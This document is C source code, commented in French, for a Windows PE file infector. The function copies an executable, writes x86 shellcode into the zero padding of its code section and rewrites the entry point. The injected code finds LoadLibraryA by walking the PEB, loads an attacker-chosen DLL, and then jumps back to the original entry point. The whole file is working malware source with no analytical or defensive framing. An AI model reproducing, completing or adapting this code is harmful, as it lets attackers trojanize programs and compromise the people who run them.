#include "inf.h"

int infect_file(char* fileName, char* dllName)
{
	FILE* file1;
	FILE* file2;
	DWORD offsetPeHeader, baseOfCode, sizeOfCode, endOfCode, oep, copyZone;
	int nbPops, i, j, shellcodeBlen, totalShellcodeLen, sizeDllName, sizeOfCodePadding;
	//shellcode load library, met &(kernel32.LoadLibraryA) dans EAX en parsant le PEB puis l'EAT de kernel32.dll en mémoire (trouvée via le PEB)
	char shellcodeA[]=
		"\x33\xDB\x64\x8B\x1D\x30\x00\x00\x00\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x43\x28\x81\x38\x6B\x00\x65\x00\x75\x2D\x81\x78\x04\x72"
		"\x00\x6E\x00\x75\x24\x81\x78\x08\x65\x00\x6C\x00\x75\x1B\x81\x78\x0C\x33\x00\x32\x00\x75\x12\x81\x78\x10\x2E\x00\x64\x00\x75\x09"
		"\x81\x78\x14\x6C\x00\x6C\x00\x74\x04\x8B\x1B\xEB\xC4\x8B\x5B\x10\x8B\x43\x3C\x03\xC3\x83\xC0\x78\x8B\x00\x03\xC3\x8B\x48\x18\x8B"
		"\x50\x1C\x03\xD3\x52\x8B\x50\x24\x03\xD3\x52\x8B\x40\x20\x03\xC3\x33\xD2\x50\x8B\x00\x03\xC3\x81\x38\x4C\x6F\x61\x64\x75\x12\x81"
		"\x78\x04\x4C\x69\x62\x72\x75\x09\x81\x78\x08\x61\x72\x79\x41\x74\x0A\x58\x83\xC0\x04\x50\x42\x3B\xCA\x75\xD8\x58\x58\x33\xC9\x83"
		"\xC0\x02\x41\x3B\xCA\x75\xF8\x33\xD2\x0F\xB7\x08\x58\x83\xC0\x04\x42\x3B\xD1\x75\xF8\x8B\x00\x03\xC3";
	char* shellcodeB;
	//jmp sur l'OEP
	char shellcodeC[]="\xE9\xDE\xAD\xBE\xEF";
	BYTE* PEheaderContent;
	BYTE byteRead;

	//a rajouter : 
	//	"\x6A\x00"					; push 0
	//	N * "\x68\xAA\xAA\xAA\xAA"	; push "NAME"
	//	"\x54"						; push ESP
	//	"\xFF\xD0"					; call EAX
	//	"\x58\x58\x58\x58";			; pop eax *4

	//2 pops à la base : push 0/push ESP
	nbPops=2;
	//nom de la chaine
	sizeDllName=strlen(dllName);
	
	//nombre de pushs à faire (4 byte par 4 byte)
	nbPops = nbPops+ sizeDllName / 4;
	//si ça tombe pas juste...
	if(sizeDllName % 4 != 0)
		nbPops++;
	// taille de shellcodeB = (nbPops - 2) * 5 + 2 + 1 + 2 + nbPops
	shellcodeBlen = (nbPops-2)*5+2+1+2+nbPops;

	shellcodeB=new char[shellcodeBlen];
	memset(shellcodeB, 0x00, shellcodeBlen);
	//push 0
	shellcodeB[0]='\x6A';
	shellcodeB[1]='\x00';
	//pops de fin
	for(i = shellcodeBlen -1; i > shellcodeBlen - 1 - nbPops; i--)
	{
		shellcodeB[i]='\x58';
	}
	//push ESP
	shellcodeB[i]='\xD0';
	i--;
	shellcodeB[i]='\xFF';
	//call EAX
	i--;
	shellcodeB[i]='\x54';
	i = i-5;
	j=0;
	//push du nom de la dll
	while(i>1)
	{
		shellcodeB[i]='\x68'; //push AAAA
		shellcodeB[i+1]=dllName[j];
		if(j < sizeDllName -1)
		{
			shellcodeB[i+2]=dllName[j+1];

			if(j < sizeDllName -2)
			{
				shellcodeB[i+3]=dllName[j+2];

				if(j < sizeDllName -3)
					shellcodeB[i+4]=dllName[j+3];
			}
		}
		i = i-5;
		j = j+4;
	}

	//longueur totale = nbbytes(shellcodeA)+nbbytes(shellcodeB)+nbbytes(shellcodeC);
	totalShellcodeLen=shellcodeBlen+5+185;
	
	file1=fopen(fileName, "rb");
	if(!file1)
	{
		delete[] shellcodeB;
		shellcodeB = NULL;
		return 1;
	}
	file2=fopen("infected.exe", "wb");
	if(!file2)
	{
		delete[] shellcodeB;
		shellcodeB = NULL;
		fclose(file1);
		return 2;
	}

	//lecture du PE header
	PEheaderContent=new BYTE[1024];
	if(fread(PEheaderContent, 1, 1024, file1)!=1024)
	{
		delete[] shellcodeB;
		shellcodeB = NULL;
		delete[] PEheaderContent;
		PEheaderContent = NULL;
		fclose(file1);
		fclose(file2);
		return 3;
	}
	if(PEheaderContent[0]!='M' && PEheaderContent[1]!='Z')
	{
		delete[] shellcodeB;
		shellcodeB = NULL;
		delete[] PEheaderContent;
		PEheaderContent = NULL;
		fclose(file1);
		fclose(file2);
		return 3;
	}
	offsetPeHeader=*(PDWORD)(PEheaderContent + 0x3C);
	if(offsetPeHeader < 0x02 || offsetPeHeader > 900)
	{
		delete[] shellcodeB;
		shellcodeB = NULL;
		delete[] PEheaderContent;
		PEheaderContent = NULL;
		fclose(file1);
		fclose(file2);
		return 4;
	}
	if(*(PDWORD)(PEheaderContent + offsetPeHeader)!=0x4550 ||
				*(PWORD)(PEheaderContent + offsetPeHeader + 4)!=0x014c ||
				*(PWORD)(PEheaderContent + offsetPeHeader + 0x18)!=0x010B )
	{
		delete[] shellcodeB;
		shellcodeB = NULL;
		delete[] PEheaderContent;
		PEheaderContent = NULL;
		fclose(file1);
		fclose(file2);
		return 3;
	}
	
	//lecture de l'OEP et des données de la section de code
	baseOfCode = *(PDWORD)(PEheaderContent + offsetPeHeader + 0x2C);
	sizeOfCode = *(PDWORD)(PEheaderContent + offsetPeHeader + 0x1C);
	endOfCode = baseOfCode + sizeOfCode - 1;
	oep = *(PDWORD)(PEheaderContent + offsetPeHeader + 0x28);

	//on se place à la fin de la section, et on remonte tant qu'on trouve 0x00
	byteRead = 0x00;
	sizeOfCodePadding = 0;
	while(byteRead == 0x00)
	{
		fseek(file1, endOfCode-sizeOfCodePadding, SEEK_SET);
		fread(&byteRead, 1, 1, file1);
		if(byteRead == 0x00)
			sizeOfCodePadding++;
	}


	//est-ce qu'on a la place ?
	if(sizeOfCodePadding < totalShellcodeLen)
	{
		delete[] shellcodeB;
		shellcodeB = NULL;
		delete[] PEheaderContent;
		PEheaderContent = NULL;
		fclose(file1);
		fclose(file2);
		return 5;
	}

	//zone de copie trouvée!
	copyZone = endOfCode-sizeOfCodePadding+1;
	
	//patch de l'OEP
	*(PDWORD)(PEheaderContent + offsetPeHeader + 0x28) = copyZone;

	//copie du JMP
	*(PDWORD)(shellcodeC+1) = oep - copyZone - totalShellcodeLen;
	
	//recopie du header patché
	fwrite(PEheaderContent, 1, 1024, file2);
	
	//recopie du fichier
	fseek(file1, 1024, SEEK_SET);

	i = 1024;
	while(i < copyZone)
	{
		fread(&byteRead, 1, 1, file1);
		fwrite(&byteRead, 1, 1, file2);
		i++;
	}

	//copie du shellcodeA
	fwrite(shellcodeA, 1, 185, file2);
	//copie du shellcodeB
	fwrite(shellcodeB, 1, shellcodeBlen, file2);
	//copie du shellcodeC
	fwrite(shellcodeC, 1, 5, file2);

	//copie du reste du fichier
	fseek(file1, copyZone+totalShellcodeLen, SEEK_SET);

	while(!feof(file1))
	{
		fread(&byteRead, 1, 1, file1);
		fwrite(&byteRead, 1, 1, file2);
	}

	fclose(file1);
	fclose(file2);

	delete[] shellcodeB;
	shellcodeB = NULL;
	delete[] PEheaderContent;
	PEheaderContent = NULL;
	return 0;
}